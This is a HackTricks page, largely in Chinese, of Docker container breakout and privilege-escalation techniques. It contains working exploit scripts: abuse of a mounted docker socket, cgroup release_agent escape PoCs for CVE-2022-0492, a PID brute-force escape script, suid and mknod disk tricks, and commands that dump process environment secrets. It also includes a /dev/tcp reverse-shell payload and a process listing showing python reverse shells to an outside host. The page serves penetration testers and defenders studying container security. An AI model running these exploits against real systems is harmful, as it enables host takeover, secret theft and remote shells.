# Docker Breakout / Privilege Escalation

<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 自动枚举 & 逃逸

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): 它也可以**枚举容器**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 这个工具非常**有用，用于枚举你所在的容器甚至尝试自动逃逸**
* [**amicontained**](https://github.com/genuinetools/amicontained): 有用的工具，用于获取容器的权限，以便找到逃离它的方法
* [**deepce**](https://github.com/stealthcopter/deepce): 枚举和逃离容器的工具
* [**grype**](https://github.com/anchore/grype): 获取安装在镜像中的软件包含的CVEs

## 挂载的Docker Socket逃逸

如果你发现**docker socket被挂载**在docker容器内部，你将能够从中逃逸。\
这通常发生在出于某种原因需要连接到docker守护进程以执行操作的docker容器中。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
在这种情况下，您可以使用常规的docker命令与docker守护进程通信：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
如果**docker socket位于意外的位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与之通信。
{% endhint %}

Docker守护进程也可能[在端口上监听（默认为2375、2376）](../../../../network-services-pentesting/2375-pentesting-docker.md)，或者在基于Systemd的系统上，与Docker守护进程的通信可以通过Systemd socket `fd://`进行。

{% hint style="info" %}
此外，还要注意其他高级运行时的运行时socket：

* dockershim：`unix:///var/run/dockershim.sock`
* containerd：`unix:///run/containerd/containerd.sock`
* cri-o：`unix:///var/run/crio/crio.sock`
* frakti：`unix:///var/run/frakti.sock`
* rktlet：`unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## 权限滥用逃逸

您应该检查容器的权限，如果它具有以下任何权限，您可能能够从中逃脱：**`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

您可以使用**之前提到的自动化工具**或以下方法检查当前容器的权限：
```bash
capsh --print
```
在以下页面中，您可以**了解更多关于linux capabilities**以及如何滥用它们来逃逸/提升权限：

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## 从特权容器逃逸

可以使用`--privileged`标志或禁用特定防御来创建特权容器：

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `挂载 /dev`

`--privileged`标志引入了重大的安全问题，利用此漏洞依赖于启动一个启用了它的docker容器。使用此标志时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux capabilities的限制。您可以在此页面中**阅读`--privileged`的所有影响**：

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 特权 + hostPID

拥有这些权限，您可以只需执行以下命令，就可以**移动到主机上作为root运行的进程的命名空间**，比如init（pid:1）：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

在容器中执行以下命令来测试它：
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### 特权

仅使用特权标志，您可以尝试**访问主机的磁盘**或尝试**通过滥用 release\_agent 或其他逃逸技术来逃脱**。

在容器中执行以下绕过测试：
```bash
docker run --rm -it --privileged ubuntu bash
```
#### 挂载磁盘 - Poc1

配置良好的docker容器不会允许像**fdisk -l**这样的命令。然而，在配置错误的docker命令中，如果指定了`--privileged`或带有caps的`--device=/dev/sda1`标志，就有可能获得查看宿主驱动器的权限。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

因此，要接管宿主机器，这是微不足道的：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
```markdown
And voilà ! 您现在可以访问宿主机的文件系统，因为它被挂载在 `/mnt/hola` 文件夹中。

#### 挂载磁盘 - Poc2

在容器内部，攻击者可能会尝试通过集群创建的可写 hostPath 卷来进一步访问底层宿主操作系统。以下是一些您可以在容器内检查的常见事项，以查看是否可以利用这个攻击向量：
```
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 利用现有的 release\_agent 进行特权逃逸 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="初始 PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### 利用创建的 release\_agent 实现特权逃逸 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="第二个 PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
```markdown
{% endcode %}

查看该技术的**解释**：

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### 利用 release\_agent 在不知道相对路径的情况下进行特权逃逸 - PoC3

在之前的漏洞中，**容器在宿主文件系统内的绝对路径被泄露**。然而，情况并非总是如此。在你**不知道容器在宿主内的绝对路径**的情况下，你可以使用这种技术：

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
执行 PoC 在一个特权容器内应该提供类似的输出：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 利用敏感挂载进行特权逃逸

有几个可能被挂载的文件，它们提供了**关于底层主机的信息**。其中一些甚至可能指示**当某些事情发生时由主机执行的操作**（这将允许攻击者从容器中逃逸）。\
这些文件的滥用可能允许以下操作：

* release\_agent（之前已经讨论过）
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

然而，在这个页面上你可以找到**其他敏感文件**进行检查：

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 任意挂载

在多种情况下，你会发现**容器从主机挂载了一些卷**。如果这个卷没有正确配置，你可能能够**访问/修改敏感数据**：读取秘密，更改ssh authorized\_keys……
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 使用两个 shell 和主机挂载进行权限提升

如果您作为**容器内的 root 用户**，并且挂载了来自主机的某个文件夹，同时您已经作为一个非特权用户**逃逸到主机**并且对挂载的文件夹有读取权限。\
您可以在**容器**内的**挂载文件夹**中创建一个**bash suid 文件**，然后从**主机**上**执行它**以进行权限提升。
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 使用两个 shell 的权限提升

如果你作为**容器内的 root 用户**访问，并且你已经**作为非特权用户逃逸到宿主机**，如果你在容器内拥有 MKNOD 能力（默认情况下就有），你可以利用两个 shell 在宿主机内**提升权限**，正如[**这篇文章中解释的**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
拥有这种能力的容器内 root 用户被允许**创建块设备文件**。设备文件是用来**访问底层硬件和内核模块**的特殊文件。例如，/dev/sda 块设备文件允许**读取系统磁盘上的原始数据**。

Docker 确保块设备**不能在容器内被滥用**，通过在容器上设置一个 cgroup 策略来阻止对块设备的读写。\
然而，如果一个块设备是**在容器内创建的，它可以通过 /proc/PID/root/ 文件夹被**容器外的人访问，限制是**进程必须由容器外部和内部的同一用户拥有**。

**利用**示例来自这篇[**文章**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)：
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

如果您能够访问宿主机的进程，您将能够访问存储在这些进程中的大量敏感信息。运行测试实验室：
```
docker run --rm -it --pid=host ubuntu bash
```
例如，您可以使用 `ps auxn` 列出进程，并在命令中搜索敏感细节。

然后，由于您可以**在 /proc/ 中访问主机的每个进程，您可以通过运行以下命令来窃取它们的 env 密钥**：
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
你也可以**访问其他进程的文件描述符并读取它们打开的文件**：
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
您还可以**杀死进程并导致服务拒绝（DoS）**。

{% hint style="warning" %}
如果您不知怎么地拥有了容器外部某个进程的特权**访问权限**，您可以运行类似 `nsenter --target <pid> --all` 或 `nsenter --target <pid> --mount --net --pid --cgroup` 的命令，以**以与该进程相同的命名空间限制（希望没有）运行一个shell。**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
如果容器配置了Docker[宿主网络驱动(`--network=host`)](https://docs.docker.com/network/host/)，该容器的网络栈不与Docker宿主隔离（容器共享宿主的网络命名空间），且容器不会分配自己的IP地址。换句话说，**容器将所有服务直接绑定到宿主的IP上**。此外，容器可以**拦截宿主在共享接口`tcpdump -i eth0`上发送和接收的所有网络流量**。

例如，您可以使用此方法**嗅探甚至伪造宿主和元数据实例之间的流量**。

如以下示例所示：

* [写作：如何联系Google SRE：在云SQL中植入一个shell](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [元数据服务MITM允许根权限提升（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

您还将能够访问宿主内部绑定到localhost的**网络服务**，甚至访问**节点的元数据权限**（这些权限可能与容器可以访问的权限不同）。

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
如果你只有 `hostIPC=true`，你很可能无法做太多事情。如果宿主机上的任何进程或其他 pod 中的任何进程正在使用宿主机的**进程间通信机制**（共享内存、信号量数组、消息队列等），你将能够读写这些相同的机制。你首先要查看的地方是 `/dev/shm`，因为它在任何设置了 `hostIPC=true` 的 pod 和宿主机之间共享。你还应该使用 `ipcs` 检查其他 IPC 机制。

* **检查 /dev/shm** - 查找此共享内存位置中的任何文件：`ls -la /dev/shm`
* **检查现有的 IPC 设施** - 你可以使用 `/usr/bin/ipcs` 检查是否有任何 IPC 设施正在使用。检查方法为：`ipcs -a`

### 恢复能力

如果系统调用 **`unshare`** 没有被禁止，你可以通过运行以下命令恢复所有能力：
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### 用户命名空间通过符号链接滥用

在帖子[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)中解释的第二种技术表明，你可以滥用用户命名空间的绑定挂载，以影响主机内的文件（在那个特定案例中，删除文件）。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc 漏洞 (CVE-2019-5736)

如果你能够以 root 身份执行 `docker exec`（可能需要通过 sudo），你可以尝试通过滥用 CVE-2019-5736（[这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)有漏洞利用程序）来提升权限，从容器中逃逸。这项技术基本上会**覆盖**容器**主机**的 _**/bin/sh**_ 二进制文件，因此任何执行 docker exec 的人可能会触发有效载荷。

根据需要更改有效载荷并使用 `go build main.go` 构建 main.go。生成的二进制文件应放置在 docker 容器中执行。\
执行后，一旦显示 `[+] Overwritten /bin/sh successfully`，你需要从主机上执行以下操作：

`docker exec -it <container-name> /bin/sh`

这将触发 main.go 文件中存在的有效载荷。

更多信息：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
容器可能还有其他 CVE 漏洞，你可以在[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)找到一个列表。
{% endhint %}

## Docker 自定义逃逸

### Docker 逃逸面

* **命名空间：** 进程应该通过命名空间与其他进程**完全隔离**，因此我们不能通过命名空间与其他进程交互（默认情况下不能通过 IPCs、unix 套接字、网络服务、D-Bus、其他进程的 `/proc` 通信）。
* **Root 用户：** 默认情况下，运行进程的用户是 root 用户（但其权限有限）。
* **能力：** Docker 保留以下能力：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **系统调用：** 这些是**root 用户无法调用**的系统调用（因为缺乏能力 + Seccomp）。其他系统调用可以用来尝试逃逸。

{% tabs %}
{% tab title="x64 系统调用" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 系统调用" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
